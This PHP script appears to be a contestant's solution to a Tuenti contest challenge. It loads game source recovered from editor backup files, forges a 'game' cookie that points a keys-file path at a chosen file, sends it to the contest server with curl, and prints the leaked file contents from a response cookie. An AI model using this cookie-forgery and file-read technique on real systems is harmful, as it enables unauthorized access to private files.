<?php

/**
 * This is part of the original code of the game, I only downloaded it using the ~ at
 * the end of the files, that is the character that the KATE editor uses 
 */
$projectDir = 'demo/';

require_once($projectDir . 'board.php');
require_once($projectDir . 'game.php');
require_once($projectDir . 'page.php');
require_once($projectDir . 'piece.php');
require_once($projectDir . 'webDisplay.php');

$page = new page();

/**
 * I added the method getFakeCookie to the page class, in order to generate a google with the input that I want.
 * This method replaces the path to the keys file to the path that I want, and creates the spoofed cookie
 */
$strCookie = $page->getFakeCookie(readline());

/**
 * Do the spoofed call to the server, the server will response me with the "X-Tuenti-Powered-By=" cookie who will
 * contain the content of the file :)
 */
$curl_handle = curl_init('http://ttt.contest.tuenti.net/?x=1&y=1'); 

curl_setopt($curl_handle, CURLOPT_COOKIE, "game=" . $strCookie); 
curl_setopt($curl_handle, CURLOPT_HEADER, true); 
curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, true); 

$info = curl_exec($curl_handle); 
curl_getinfo($curl_handle);
curl_close($curl_handle); 

// Parse the Cooke, That's all folks....
$firstPart = explode('Set-Cookie: X-Tuenti-Powered-By=', $info);
$cookie = explode(';', $firstPart[1]);
print urldecode($cookie[0]);
